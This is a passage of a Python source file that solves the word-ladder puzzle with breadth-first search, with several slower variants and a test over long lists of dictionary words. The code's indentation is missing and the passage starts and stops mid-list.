arat","nuked","gorge","kinks","skull","noyce","aimee","watch","cleat","stuck","china","testy","doses","safes","stage","bayes","twins","limps","denis","chars","flaps","paces","abase","grays","deans","maria","asset","smuts","serbs","whigs","vases","robyn","girls","pents","alike","nodal","molly","swigs","swill","slums","rajah","bleep","beget","thanh","finns","clock","wafts","wafer","spicy","sorer","reach","beats","baker","crown","drugs","daisy","mocks","scots","fests","newer","agate","drift","marta","chino","flirt","homed","bribe","scram","bulks","servo","vesta","divas","preps","naval","tally","shove","ragas","blown","droll","tryst","lucky","leech","lines","sires","pyxed","taper","trump","payee","midge","paris","bored","loads","shuts","lived","swath","snare","boned","scars","aeons","grime","writs","paige","rungs","blent","signs","davis","dials","daubs","rainy","fawns","wrier","golds","wrath","ducks","allow","hosea","spike","meals","haber","muses","timed","broom","burks","louis","gangs","pools","vales","altai","elope","plied","slain","chasm","entry","slide","bawls","title","sings","grief","viola","doyle","peach","davit","bench","devil","latex","miles","pasha","tokes","coves","wheel","tried","verdi","wanda","sivan","prior","fryer","plots","kicky","porch","shill","coats","borne","brink","pawed","erwin","tense","stirs","wends","waxen","carts","smear","rival","scare","phase","bragg","crane","hocks","conan","bests","dares","molls","roots","dunes","slips","waked","fours","bolds","slosh","yemen","poole","solid","ports","fades","legal","cedes","green","curie","seedy","riper","poled","glade","hosts","tools","razes","tarry","muddy","shims","sword","thine","lasts","bloat","soled","tardy","foots","skiff","volta","murks","croci","gooks","gamey","pyxes","poems","kayla","larva","slaps","abuse","pings","plows","geese","minks","derby","super","inked","manic","leaks","flops","lajos","fuzes","swabs","twigs","gummy","pyres","shrew","islet","doled","wooly","lefts","hunts","toast","faith","macaw","sonia","leafs","colas","conks","altos","wiped","scene","boors","patsy","meany","chung","wakes","clear","ropes","tahoe","zones","crate","tombs","nouns","garth","puked","chats","hanks","baked","binds","fully","soaps","newel","yarns","puers","carps","spelt","lully","towed","scabs","prime","blest","patty","silky","abner","temps","lakes","tests","alias","mines","chips","funds","caret","splat","perry","turds","junks","cramp","saned","peary","snarl","fired","stung","nancy","bulge","styli","seams","hived","feast","triad","jaded","elvin","canny","birth","routs","rimed","pusey","laces","taste","basie","malls","shout","prier","prone","finis","claus","loops","heron","frump","spare","menus","ariel","crams","bloom","foxed","moons","mince","mixed","piers","deres","tempt","dryer","atone","heats","dario","hawed","swims","sheet","tasha","dings","clare","aging","daffy","wried","foals","lunar","havel","irony","ronny","naves","selma","gurus","crust","percy","murat","mauro","cowed","clang","biker","harms","barry","thump","crude","ulnae","thong","pager","oases","mered","locke","merle","soave","petal","poser","store","winch","wedge","inlet","nerdy","utter","filth","spray","drape","pukes","ewers","kinds","dates","meier","tammi","spoor","curly","chill","loped","gooey","boles","genet","boost","beets","heath","feeds","growl","livid","midst","rinds","fresh","waxed","yearn","keeps","rimes","naked","flick","plies","deeps","dirty","hefty","messy","hairy","walks","leper","sykes","nerve","rover","jived","brisk","lenin","viper","chuck","sinus","luger","ricks","hying","rusty","kathy","herds","wider","getty","roman","sandy","pends","fezes","trios","bites","pants","bless","diced","earth","shack","hinge","melds","jonah","chose","liver","salts","ratty","ashed","wacky","yokes","wanly","bruce","vowel","black","grail","lungs","arise","gluts","gluey","navel","coyer","ramps","miter","aldan","booth","musty","rills","darns","tined","straw","kerri","hared","lucks","metes","penny","radon","palms","deeds","earls","shard","pried","tampa","blank","gybes","vicki","drool","groom","curer","cubes","riggs","lanky","tuber","caves","acing","golly","hodge","beard","ginny","jibed","fumes","astor","quito","cargo","randi","gawky","zings","blind","dhoti","sneak","fatah","fixer","lapps","cline","grimm","fakes","maine","erika","dealt","mitch","olden","joist","gents","likes","shelf","silts","goats","leads","marin","spire","louie","evans","amuse","belly","nails","snead","model","whats","shari","quote","tacks","nutty","lames","caste","hexes","cooks","miner","shawn","anise","drama","trike","prate","ayers","loans","botch","vests","cilia","ridge","thugs","outed","jails","moped","plead","tunes","nosed","wills","lager","lacks","cried","wince","berle","flaws","boise","tibet","bided","shred","cocky","brice","delta","congo","holly","hicks","wraps","cocks","aisha","heard","cured","sades","horsy","umped","trice","dorky","curve","ferry","haler","ninth","pasta","jason","honer","kevin","males","fowls","awake","pores","meter","skate","drink","pussy","soups","bases","noyes","torts","bogus","still","soupy","dance","worry","eldon","stern","menes","dolls","dumpy","gaunt","grove","coops","mules","berry","sower","roams","brawl","greed","stags","blurs","swift","treed","taney","shame","easel","moves","leger","ville","order","spock","nifty","brian","elias","idler","serve","ashen","bizet","gilts","spook","eaten","pumas","cotes","broke","toxin","groan","laths","joins","spots","hated","tokay","elite","rawer","fiats","cards","sassy","milks","roost","glean","lutes","chins","drown","marks","pined","grace","fifth","lodes","rusts","terms","maxes","savvy","choir","savoy","spoon","halve","chord","hulas","sarah","celia","deems","ninny","wines","boggy","birch","raved","wales","beams","vibes","riots","warty","nigel","askew","faxes","sedge","sheol","pucks","cynic","relax","boers","whims","bents","candy","luann","slogs","bonny","barns","iambs","fused","duffy","guilt","bruin","pawls","penis","poppy","owing","tribe","tuner","moray","timid","ceded","geeks","kites","curio","puffy","perot","caddy","peeve","cause","dills","gavel","manse","joker","lynch","crank","golda","waits","wises","hasty","paves","grown","reedy","crypt","tonne","jerky","axing","swept","posse","rings","staff","tansy","pared","glaze","grebe","gonna","shark","jumps","vials","unset","hires","tying","lured","motes","linen","locks","mamas","nasty","mamie","clout","nader","velma","abate","tight","dales","serer","rives","bales","loamy","warps","plato","hooch","togae","damps","ofter","plumb","fifes","filmy","wiper","chess","lousy","sails","brahe","ounce","flits","hindu","manly","beaux","mimed","liken","forts","jambs","peeps","lelia","brews","handy","lusty","brads","marne","pesos","earle","arson","scout","showy","chile","sumps","hiked","crook","herbs","silks","alamo","mores","dunce","blaze","stank","haste","howls","trots","creon","lisle","pause","hates","mulch","mined","moder","devin","types","cindy","beech","tuned","mowed","pitts","chaos","colds","bidet","tines","sighs","slimy","brain","belle","leery","morse","ruben","prows","frown","disco","regal","oaken","sheds","hives","corny","baser","fated","throe","revel","bores","waved","shits","elvia","ferns","maids","color","coifs","cohan","draft","hmong","alton","stine","cluck","nodes","emily","brave","blair","blued","dress","bunts","holst","clogs","rally","knack","demos","brady","blues","flash","goofy","blocs","diane","colic","smile","yules","foamy","splay","bilge","faker","foils","condo","knell","crack","gallo","purls","auras","cakes","doves","joust","aides","lades","muggy","tanks","middy","tarps","slack","capet","frays","donny","venal","yeats","misty","denim","glass","nudes","seeps","gibbs","blows","bobbi","shane","yards","pimps","clued","quiet","witch","boxes","prawn","kerry","torah","kinko","dingy","emote","honor","jelly","grins","trope","vined","bagel","arden","rapid","paged","loved","agape","mural","budge","ticks","suers","wendi","slice","salve","robin","bleat","batik","myles","teddy","flatt","puppy","gelid","largo","attar","polls","glide","serum","fundy","sucks","shalt","sewer","wreak","dames","fonts","toxic","hines","wormy","grass","louse","bowls","crass","benny","moire","margo","golfs","smart","roxie","wight","reign","dairy","clops","paled","oddly","sappy","flair","shown","bulgy","benet","larch","curry","gulfs","fends","lunch","dukes","doris","spoke","coins","manna","conga","jinns","eases","dunno","tisha","swore","rhino","calms","irvin","clans","gully","liege","mains","besot","serge","being","welch","wombs","draco","lynda","forty","mumps","bloch","ogden","knits","fussy","alder","danes","loyal","valet","wooer","quire","liefs","shana","toyed","forks","gages","slims","cloys","yates","rails","sheep","nacho","divan","honks","stone","snack","added","basal","hasps","focus","alone","laxes","arose","lamed","wrapt","frail","clams","plait","hover","tacos","mooch","fault","teeth","marva","mucks","tread","waves","purim","boron","horde","smack","bongo","monte","swirl","deals","mikes","scold","muter","sties","lawns","fluke","jilts","meuse","fives","sulky","molds","snore","timmy","ditty","gasps","kills","carey","jawed","byers","tommy","homer","hexed","dumas","given","mewls","smelt","weird","speck","merck","keats","draws","trent","agave","wells","chews","blabs","roves","grieg","evens","alive","mulls","cared","garbo","fined","happy","trued","rodes","thurs","cadet","alvin","busch","moths","guild","staci","lever","widen","props","hussy","lamer","riley","bauer","chirp","rants","poxes","shyer","pelts","funny","slits","tinge","ramos","shift","caper","credo","renal","veils","covey","elmer","mated","tykes","wooed","briar","gears","foley","shoes","decry","hypes","dells","wilds","runts","wilts","white","easts","comer","sammy","lochs","favor","lance","dawns","bushy","muted","elsie","creel","pocks","tenet","cagey","rides","socks","ogled","soils","sofas","janna","exile","barks","frank","takes","zooms","hakes","sagan","scull","heaps","augur","pouch","blare","bulbs","wryly","homey","tubas","limbo","hardy","hoagy","minds","bared","gabby","bilks","float","limns","clasp","laura","range","brush","tummy","kilts","cooed","worms","leary","feats","robes","suite","veals","bosch","moans","dozen","rarer","slyer","cabin","craze","sweet","talon","treat","yanks","react","creed","eliza","sluts","cruet","hafts","noise","seder","flies","weeks","venus","backs","eider","uriel","vouch","robed","hacks","perth","shiny","stilt","torte","throb","merer","twits","reeds","shawl","clara","slurs","mixer","newts","fried","woolf","swoop","kaaba","oozed","mayer","caned","laius","lunge","chits","kenny","lifts","mafia","sowed","piled","stein","whack","colts","warms","cleft","girds","seeks","poets","angel","trade","parsi","tiers","rojas","vexes","bryce","moots","grunt","drain","lumpy","stabs","poohs","leapt","polly","cuffs","giddy","towns","dacha","quoth","provo","dilly","carly","mewed","tzars","crock","toked","speak","mayas","pssts","ocher","motel","vogue","camps","tharp","taunt","drone","taint","badge","scott","scats","bakes","antes","gruel","snort","capes","plate","folly","adobe","yours","papaw","hench","moods","clunk","chevy","tomas","narcs","vonda","wiles","prigs","chock","laser","viced","stiff","rouse","helps","knead","gazer","blade","tumid","avail","anger","egged","guide","goads","rabin","toddy","gulps","flank","brats","pedal","junky","marco","tinny","tires","flier","satin","darth","paley","gumbo","rared","muffs","rower","prude","frees","quays","homes","munch","beefs","leash","aston","colon","finch","bogey","leaps","tempo","posts","lined","gapes","locus","maori","nixes","liven","songs","opted","babel","wader","barer","farts","lisps","koran","lathe","trill","smirk","mamma","viler","scurf","ravel","brigs","cooky","sachs","fulls","goals","turfs","norse","hauls","cores","fairy","pluto","kneed","cheek","pangs","risen","czars","milne","cribs","genes","wefts","vents","sages","seres","owens","wiley","flume","haded","auger","tatty","onion","cater","wolfe","magic","bodes","gulls","gazes","dandy","snags","rowed","quell","spurn","shore","veldt","turns","slavs","coach","stalk","snuck","piles","orate","joyed","daily","crone","wager","solos","earns","stark","lauds","kasey","villa","gnaws","scent","wears","fains","laced","tamer","pipes","plant","lorie","rivet","tamed","cozen","theme","lifer","sunny","shags","flack","gassy","eased","jeeps","shire","fargo","timer","brash","behan","basin","volga","krone","swiss","docks","booed","ebert","gusty","delay","oared","grady","buick","curbs","crete","lucas","strum","besom","gorse","troth","donne","chink","faced","ahmed","texas","longs","aloud","bethe","cacao","hilda","eagle","karyn","harks","adder","verse","drays","cello","taped","snide","taxis","kinky","penes","wicca","sonja","aways","dyers","bolas","elfin","slope","lamps","hutch","lobed","baaed","masts","ashes","ionic","joyce","payed","brays","malts","dregs","leaky","runny","fecal","woven","hurls","jorge","henna","dolby","booty","brett","dykes","rural","fight","feels","flogs","brunt","preen","elvis","dopey","gripe","garry","gamma","fling","space","mange","storm","arron","hairs","rogue","repel","elgar","ruddy","cross","medan","loses","howdy","foams","piker","halts","jewel","avery","stool","cruel","cases","ruses","cathy","harem","flour","meted","faces","hobos","charm","jamar","cameo","crape","hooey","reefs","denny","mitts","sores","smoky","nopes","sooty","twirl","toads","vader","julep","licks","arias","wrote","north","bunks","heady","batch","snaps","claws","fouls","faded","beans","wimps","idled","pulse","goons","noose","vowed","ronda","rajas","roast","allah","punic","slows","hours","metal","slier","meaty","hanna","curvy","mussy","truth","troys","block","reels","print","miffs","busts","bytes","cream","otter","grads","siren","kilos","dross","batty","debts","sully","bares","baggy","hippy","berth","gorky","argon","wacko","harry","smoke","fails","perms","score","steps","unity","couch","kelly","rumps","fines","mouth","broth","knows","becky","quits","lauri","trust","grows","logos","apter","burrs","zincs","buyer","bayer","moose","overt","croon","ousts","lands","lithe","poach","jamel","waive","wiser","surly","works","paine","medal","glads","gybed","paint","lorre","meant","smugs","bryon","jinni","sever","viols","flubs","melts","heads","peals","aiken","named","teary","yalta","styes","heist","bongs","slops","pouts","grape","belie","cloak","rocks","scone","lydia","goofs","rents","drive","crony","orlon","narks","plays","blips","pence","march","alger","baste","acorn","billy","croce","boone","aaron","slobs","idyls","irwin","elves","stoat","doing","globe","verve","icons","trial","olsen","pecks","there","blame","tilde","milky","sells","tangy","wrack","fills","lofty","truce","quark","delia","stowe","marty","overs","putty","coral","swine","stats","swags","weans","spout","bulky","farsi","brest","gleam","beaks","coons","hater","peony","huffy","exert","clips","riven","payer","doped","salas","meyer","dryad","thuds","tilts","quilt","jetty","brood","gulch","corps","tunic","hubby","slang","wreck","purrs","punch","drags","chide","sulks","tints","huger","roped","dopes","booby","rosin","outer","gusto","tents","elude","brows","lease","ceres","laxer","worth","necks","races","corey","trait","stuns","soles","teems","scrip","privy","sight","minor","alisa","stray","spank","cress","nukes","rises","gusts","aurae","karma","icing","prose","biked","grand","grasp","skein","shaky","clump","rummy","stock","twain","zoned","offed","ghats","mover","randy","vault","craws","thees","salem","downy","sangs","chore","cited","grave","spinx","erica","raspy","dying","skips","clerk","paste","moved","rooks","intel","moses","avers","staid","yawls","blast","lyres","monks","gaits","floor","saner","waver","assam","infer","wands","bunch","dryly","weedy","honey","baths","leach","shorn","shows","dream","value","dooms","spiro","raped","shook","stead","moran","ditto","loots","tapir","looms","clove","stops","pinks","soppy","ripen","wench","shone","bauds","doric","leans","nadia","cries","camus","boozy","maris","fools","morns","bides","greek","gauss","roget","lamar","hazes","beefy","dupes","refed","felts","larry","guile","ables","wants","warns","toils","bathe","edger","paced","rinks","shoos","erich","whore","tiger","jumpy","lamas","stack","among","punts","scalp","alloy","solon","quite","comas","whole","parse","tries","reeve","tiled","deena","roomy","rodin","aster","twice","musts","globs","parch","drawn","filch","bonds","tells","droop","janis","holds","scant","lopes","based","keven","whiny","aspic","gains","franz","jerri","steel","rowel","vends","yelps","begin","logic","tress","sunni","going","barge","blood","burns","basks","waifs","bones","skill","hewer","burly","clime","eking","withs","capek","berta","cheap","films","scoot","tweed","sizer","wheat","acton","flung","ponds","tracy","fiver","berra","roger","mutes","burke","miked","valve","whisk","runes","parry","toots","japes","roars","rough","irons","romeo","cages","reeks","cigar","saiph","dully","hangs","chops","rolls","prick","acuff","spent","sulla","train","swell","frets","names","anita","crazy","sixth","blunt","fewer","large","brand","slick","spitz","rears","ogres","toffy","yolks","flock","gnawn","eries","blink","skier","feted","tones","snail","ether","barbs","noses","hears","upset","awash","cloud","trunk","degas","dungs","rated","shall","yeahs","coven","sands","susan","fable","gunny","began","serfs","balls","dinky","madge","prong","spilt","lilly","brawn","comet","spins","raids","dries","sorts","makes","mason","mayra","royce","stout","mealy","pagan","nasal","folds","libby","coups","photo","mosey","amens","speed","lords","board","fetal","lagos","scope","raked","bonus","mutts","willy","sport","bingo","thant","araby","bette","rebel","gases","small","humus","grosz","beset","slays","steve","scrap","blahs","south","pride","heels","tubes","beady","lacey","genus","mauls","vying","spice","sexes","ester","drams","today","comae","under","jests","direr","yoked","tempi","early","boats","jesus","warts","guppy","gilda","quota","token","edwin","ringo","gaped","lemon","hurst","manor","arrow","mists","prize","silas","blobs","diets","ervin","stony","buddy","bates","rabid","ducat","ewing","jaunt","beads","doyen","blush","thoth","tiles","piper","short","peron","alley","decks","shunt","whirs","cushy","roils","betty","plugs","woken","jibes","foray","merak","ruing","becks","whale","shoot","dwelt","spawn","fairs","dozed","celts","blond","tikes","sabin","feint","vamps","cokes","willa","slues","bills","force","curst","yokel","surer","miler","fices","arced","douse","hilly","lucio","tongs","togas","minty","sagas","pates","welsh","bruno","decal","elate","linux","gyros","pryor","mousy","pains","shake","spica","pupal","probe","mount","shirk","purus","kilns","rests","graze","hague","spuds","sweep","momma","burch","maces","samar","brace","riser","booms","build","camel","flyer","synge","sauna","tonga","tings","promo","hides","clair","elisa","bower","reins","diann","lubed","nulls","picks","laban","milch","buber","stomp","bosom","lying","haled","avert","wries","macon","skids","fumed","ogles","clods","antic","nosey","crimp","purge","mommy","cased","taxes","covet","clack","butch","panty","lents","machs","exude","tooth","adore","shuck","asses","after","terra","dices","aryan","regor","romes","stile","cairo","maura","flail","eaves","estes","sousa","visas","baron","civet","kitty","freed","ralph","tango","gawks","cheat","study","fancy","fiber","musks","souse","brims","claim","bikes","venue","sired","thymi","rivas","skimp","pleas","woman","gimpy","cawed","minos","pints","knock","poked","bowen","risky","towel","oinks","linus","heals","pears","codas","inner","pitch","harpy","niger","madly","bumpy","stair","files","nobel","celli","spars","jades","balmy","kooky","plums","trues","gloss","trims","daunt","tubby","dared","wadis","smell","darby","stink","drill","dover","ruler","laden","dikes","layla","fells","maker","joked","horns","these","baize","spahn","whens","edged","mushy","plume","tucks","spurs","husky","dried","bigot","pupas","drily","aware","hagar","newly","knots","pratt","feces","sabik","watts","cooke","riles","seamy","fleas","dusts","barfs","roans","pawns","vivid","kirks","tania","feral","tubae","horne","aries","brits","combs","chunk","stork","waned","texan","elide","glens","emery","autos","trams","dosed","cheri","baits","jacks","whose","fazed","matte","swans","maxed","write","spays","orion","traci","horse","stars","strut","goods","verge","scuff","award","dives","wires","burnt","dimly","sleds","mayan","biped","quirk","sofia","slabs","waste","robby","mayor","fatty","items","bowel","mires","swarm","route","swash","sooth","paved","steak","upend","sough","throw","perts","stave","carry","burgs","hilts","plane","toady","nadir","stick","foist","gnarl","spain","enter","sises","story","scarf","ryder","glums","nappy","sixes","honed","marcy","offer","kneel","leeds","lites","voter","vince","bursa","heave","roses","trees","argos","leann","grimy","zelma","crick","tract","flips","folks","smote","brier","moore","goose","baden","riled","looks","sober","tusks","house","acmes","lubes","chows","neath","vivas","defer","allay","casey","kmart","pests","proms","eying","cider","leave","shush","shots","karla","scorn","gifts","sneer","mercy","copes","faxed","spurt","monet","awoke","rocky","share","gores","drawl","tears","mooed","nones","wined","wrens","modem","beria","hovel","retch","mates","hands","stymy","peace","carat","coots","hotel","karen","hayed","mamet","cuing","paper","rages","suave","reuse","auden","costs","loner","rapes","hazel","rites","brent","pumps","dutch","puffs","noons","grams","teats","cease","honda","pricy","forgo","fleck","hired","silos","merge","rafts","halon","larks","deere","jello","cunts","sifts","boner","morin","mimes","bungs","marie","harts","snobs","sonic","hippo","comes","crops","mango","wrung","garbs","natty","cents","fitch","moldy","adams","sorta","coeds","gilds","kiddy","nervy","slurp","ramon","fuzed","hiker","winks","vanes","goody","hawks","crowd","bract","marla","limbs","solve","gloom","sloop","eaton","memos","tames","heirs","berms","wanes","faint","numbs","holes","grubs","rakes","waist","miser","stays","antis","marsh","skyed","payne","champ","jimmy","clues","fatal","shoed","freon","lopez","snowy","loins","stale","thank","reads","isles","grill","align","saxes","rubin","rigel","walls","beers","wispy","topic","alden","anton","ducts","david","duets","fries","oiled","waken","allot","swats","woozy","tuxes","inter","dunne","known","axles","graph","bumps","jerry","hitch","crews","lucia","banal","grope","valid","meres","thick","lofts","chaff","taker","glues","snubs","trawl","keels","liker","stand","harps","casks","nelly","debby","panes","dumps","norma","racks","scams","forte","dwell","dudes","hypos","sissy","swamp","faust","slake","maven","lowed","lilts","bobby","gorey","swear","nests","marci","palsy","siege","oozes","rates","stunt","herod","wilma","other","girts","conic","goner","peppy","class","sized","games","snell","newsy","amend","solis","duane","troop","linda","tails","woofs","scuds","shies","patti","stunk","acres","tevet","allen","carpi","meets","trend","salty","galls","crept","toner","panda","cohen","chase","james","bravo","styed","coals","oates","swami","staph","frisk","cares","cords","stems","razed","since","mopes","rices","junes","raged","liter","manes","rearm","naive","tyree","medic","laded","pearl","inset","graft","chair","votes","saver","cains","knobs","gamay","hunch","crags","olson","teams","surge","wests","boney","limos","ploys","algae","gaols","caked","molts","glops","tarot","wheal","cysts","husks","vaunt","beaus","fauns","jeers","mitty","stuff","shape","sears","buffy","maced","fazes","vegas","stamp","borer","gaged","shade","finds","frock","plods","skied","stump","ripes","chick","cones","fixed","coled","rodeo","basil","dazes","sting","surfs","mindy","creak","swung","cadge","franc","seven","sices","weest","unite","codex","trick","fusty","plaid","hills","truck","spiel","sleek","anons","pupae","chiba","hoops","trash","noted","boris","dough","shirt","cowls","seine","spool","miens","yummy","grade","proxy","hopes","girth","deter","dowry","aorta","paean","corms","giant","shank","where","means","years","vegan","derek","tales"]))
class Solution:
def is_neighbor(self, p, q):
diff = 0
for a, b in zip(p, q):
if a != b:
diff += 1
if diff > 1:
return False
return True
def ladderLength(self, start, end, dct):
q = [start]
visited = {start}
lvl = 1
while q:
cur_q = []
for a in q:
if a == end:
return lvl
for b in dct:
if b not in visited and self.is_neighbor(a, b):
visited.add(b)
cur_q.append(b)
lvl += 1
q = cur_q
return 0
def ladderLength_TLE(self, start, end, dict):
lst = [start]+list(dict)
dp = [[-1 for _ in lst] for _ in lst]
def diff_count(s1, s2):
count = 0
str1 = lst[s1]
str2 = lst[s2]
for i in xrange(len(str1)):
if count>1:
return -1
if str1[i]!=str2[i]:
count += 1
return count
for i in xrange(len(lst)):
for j in xrange(i, len(lst)):
dp[i][j] = diff_count(i, j)
dp[j][i] = dp[i][j]
visited = [False for _ in lst]
path_len = 0
queue = [0]
visited[0] = True
while queue:
path_len += 1
length = len(queue)
for i in xrange(length):
if lst[queue[i]]==end:
return path_len
for ind in xrange(1, len(lst)):
if not visited[ind] and dp[ind][queue[i]]==1:
queue.append(ind)
visited[ind] = True
queue = queue[length:]
return path_len
def ladderLength_TLE2(self, start, end, dict):
def diff_count(str1, str2):
count = 0
for i in xrange(len(str1)):
if count>1:
return -1
if str1[i]!=str2[i]:
count += 1
return count
path_len = 0
queue = [start]
while queue:
path_len += 1
length = len(queue)
for i in xrange(length):
if queue[i]==end:
return path_len
remain_set = set(dict)
for item in dict:
if diff_count(item, queue[i])==1:
queue.append(item)
remain_set.remove(item)
dict = remain_set
queue = queue[length:]
return path_len
def ladderLength_complex(self, start, end, dict):
path_len = 0
lower_cases = [chr(i+ord('a')) for i in xrange(26)]
queue = [start]
dict.remove(start)
while True:
path_len += 1
length_0 = len(queue)
for i in xrange(length_0):
current = queue[i]
if current==end:
return path_len
current = queue[i]
for pos in xrange(len(current)):
lst = list(current)
for char in lower_cases:
lst[pos] = char
temp = "".join(lst)
if temp in dict:
queue.append(temp)
dict.remove(temp)
queue = queue[length_0:]
if not queue:
return 0
return path_len
if __name__=="__main__":
assert Solution().ladderLength("sand", "acne", set(
["slit", "bunk", "wars", "ping", "viva", "wynn", "wows", "irks", "gang", "pool", "mock", "fort", "heel", "send",
"ship", "cols", "alec", "foal", "nabs", "gaze", "giza", "mays", "dogs", "karo", "cums", "jedi", "webb", "lend",
"mire", "jose", "catt", "grow", "toss", "magi", "leis", "bead", "kara", "hoof", "than", "ires", "baas", "vein",
"kari", "riga", "oars", "gags", "thug", "yawn", "wive", "view", "germ", "flab", "july", "tuck", "rory", "bean",
"feed", "rhee", "jeez", "gobs", "lath", "desk", "yoko", "cute", "zeus", "thus", "dims", "link", "dirt", "mara",
"disc", "limy", "lewd", "maud", "duly", "elsa", "hart", "rays", "rues", "camp", "lack", "okra", "tome", "math",
"plug", "monk", "orly", "friz", "hogs", "yoda", "poop", "tick", "plod", "cloy", "pees", "imps", "lead", "pope",
"mall", "frey", "been", "plea", "poll", "male", "teak", "soho", "glob", "bell", "mary", "hail", "scan", "yips",
"like", "mull", "kory", "odor", "byte", "kaye", "word", "honk", "asks", "slid", "hopi", "toke", "gore", "flew",
"tins", "mown", "oise", "hall", "vega", "sing", "fool", "boat", "bobs", "lain", "soft", "hard", "rots", "sees",
"apex", "chan", "told", "woos", "unit", "scow", "gilt", "beef", "jars", "tyre", "imus", "neon", "soap", "dabs",
"rein", "ovid", "hose", "husk", "loll", "asia", "cope", "tail", "hazy", "clad", "lash", "sags", "moll", "eddy",
"fuel", "lift", "flog", "land", "sigh", "saks", "sail", "hook", "visa", "tier", "maws", "roeg", "gila", "eyes",
"noah", "hypo", "tore", "eggs", "rove", "chap", "room", "wait", "lurk", "race", "host", "dada", "lola", "gabs",
"sobs", "joel", "keck", "axed", "mead", "gust", "laid", "ends", "oort", "nose", "peer", "kept", "abet", "iran",
"mick", "dead", "hags", "tens", "gown", "sick", "odis", "miro", "bill", "fawn", "sumo", "kilt", "huge", "ores",
"oran", "flag", "tost", "seth", "sift", "poet", "reds", "pips", "cape", "togo", "wale", "limn", "toll", "ploy",
"inns", "snag", "hoes", "jerk", "flux", "fido", "zane", "arab", "gamy", "raze", "lank", "hurt", "rail", "hind",
"hoot", "dogy", "away", "pest", "hoed", "pose", "lose", "pole", "alva", "dino", "kind", "clan", "dips", "soup",
"veto", "edna", "damp", "gush", "amen", "wits", "pubs", "fuzz", "cash", "pine", "trod", "gunk", "nude", "lost",
"rite", "cory", "walt", "mica", "cart", "avow", "wind", "book", "leon", "life", "bang", "draw", "leek", "skis",
"dram", "ripe", "mine", "urea", "tiff", "over", "gale", "weir", "defy", "norm", "tull", "whiz", "gill", "ward",
"crag", "when", "mill", "firs", "sans", "flue", "reid", "ekes", "jain", "mutt", "hems", "laps", "piss", "pall",
"rowe", "prey", "cull", "knew", "size", "wets", "hurl", "wont", "suva", "girt", "prys", "prow", "warn", "naps",
"gong", "thru", "livy", "boar", "sade", "amok", "vice", "slat", "emir", "jade", "karl", "loyd", "cerf", "bess",
"loss", "rums", "lats", "bode", "subs", "muss", "maim", "kits", "thin", "york", "punt", "gays", "alpo", "aids",
"drag", "eras", "mats", "pyre", "clot", "step", "oath", "lout", "wary", "carp", "hums", "tang", "pout", "whip",
"fled", "omar", "such", "kano", "jake", "stan", "loop", "fuss", "mini", "byrd", "exit", "fizz", "lire", "emil",
"prop", "noes", "awed", "gift", "soli", "sale", "gage", "orin", "slur", "limp", "saar", "arks", "mast", "gnat",
"port", "into", "geed", "pave", "awls", "cent", "cunt", "full", "dint", "hank", "mate", "coin", "tars", "scud",
"veer", "coax", "bops", "uris", "loom", "shod", "crib", "lids", "drys", "fish", "edit", "dick", "erna", "else",
"hahs", "alga", "moho", "wire", "fora", "tums", "ruth", "bets", "duns", "mold", "mush", "swop", "ruby", "bolt",
"nave", "kite", "ahem", "brad", "tern", "nips", "whew", "bait", "ooze", "gino", "yuck", "drum", "shoe", "lobe",
"dusk", "cult", "paws", "anew", "dado", "nook", "half", "lams", "rich", "cato", "java", "kemp", "vain", "fees",
"sham", "auks", "gish", "fire", "elam", "salt", "sour", "loth", "whit", "yogi", "shes", "scam", "yous", "lucy",
"inez", "geld", "whig", "thee", "kelp", "loaf", "harm", "tomb", "ever", "airs", "page", "laud", "stun", "paid",
"goop", "cobs", "judy", "grab", "doha", "crew", "item", "fogs", "tong", "blip", "vest", "bran", "wend", "bawl",
"feel", "jets", "mixt", "tell", "dire", "devi", "milo", "deng", "yews", "weak", "mark", "doug", "fare", "rigs",
"poke", "hies", "sian", "suez", "quip", "kens", "lass", "zips", "elva", "brat", "cosy", "teri", "hull", "spun",
"russ", "pupa", "weed", "pulp", "main", "grim", "hone", "cord", "barf", "olav", "gaps", "rote", "wilt", "lars",
"roll", "balm", "jana", "give", "eire", "faun", "suck", "kegs", "nita", "weer", "tush", "spry", "loge", "nays",
"heir", "dope", "roar", "peep", "nags", "ates", "bane", "seas", "sign", "fred", "they", "lien", "kiev", "fops",
"said", "lawn", "lind", "miff", "mass", "trig", "sins", "furl", "ruin", "sent", "cray", "maya", "clog", "puns",
"silk", "axis", "grog", "jots", "dyer", "mope", "rand", "vend", "keen", "chou", "dose", "rain", "eats", "sped",
"maui", "evan", "time", "todd", "skit", "lief", "sops", "outs", "moot", "faze", "biro", "gook", "fill", "oval",
"skew", "veil", "born", "slob", "hyde", "twin", "eloy", "beat", "ergs", "sure", "kobe", "eggo", "hens", "jive",
"flax", "mons", "dunk", "yest", "begs", "dial", "lodz", "burp", "pile", "much", "dock", "rene", "sago", "racy",
"have", "yalu", "glow", "move", "peps", "hods", "kins", "salk", "hand", "cons", "dare", "myra", "sega", "type",
"mari", "pelt", "hula", "gulf", "jugs", "flay", "fest", "spat", "toms", "zeno", "taps", "deny", "swag", "afro",
"baud", "jabs", "smut", "egos", "lara", "toes", "song", "fray", "luis", "brut", "olen", "mere", "ruff", "slum",
"glad", "buds", "silt", "rued", "gelt", "hive", "teem", "ides", "sink", "ands", "wisp", "omen", "lyre", "yuks",
"curb", "loam", "darn", "liar", "pugs", "pane", "carl", "sang", "scar", "zeds", "claw", "berg", "hits", "mile",
"lite", "khan", "erik", "slug", "loon", "dena", "ruse", "talk", "tusk", "gaol", "tads", "beds", "sock", "howe",
"gave", "snob", "ahab", "part", "meir", "jell", "stir", "tels", "spit", "hash", "omit", "jinx", "lyra", "puck",
"laue", "beep", "eros", "owed", "cede", "brew", "slue", "mitt", "jest", "lynx", "wads", "gena", "dank", "volt",
"gray", "pony", "veld", "bask", "fens", "argo", "work", "taxi", "afar", "boon", "lube", "pass", "lazy", "mist",
"blot", "mach", "poky", "rams", "sits", "rend", "dome", "pray", "duck", "hers", "lure", "keep", "gory", "chat",
"runt", "jams", "lays", "posy", "bats", "hoff", "rock", "keri", "raul", "yves", "lama", "ramp", "vote", "jody",
"pock", "gist", "sass", "iago", "coos", "rank", "lowe", "vows", "koch", "taco", "jinn", "juno", "rape", "band",
"aces", "goal", "huck", "lila", "tuft", "swan", "blab", "leda", "gems", "hide", "tack", "porn", "scum", "frat",
"plum", "duds", "shad", "arms", "pare", "chin", "gain", "knee", "foot", "line", "dove", "vera", "jays", "fund",
"reno", "skid", "boys", "corn", "gwyn", "sash", "weld", "ruiz", "dior", "jess", "leaf", "pars", "cote", "zing",
"scat", "nice", "dart", "only", "owls", "hike", "trey", "whys", "ding", "klan", "ross", "barb", "ants", "lean",
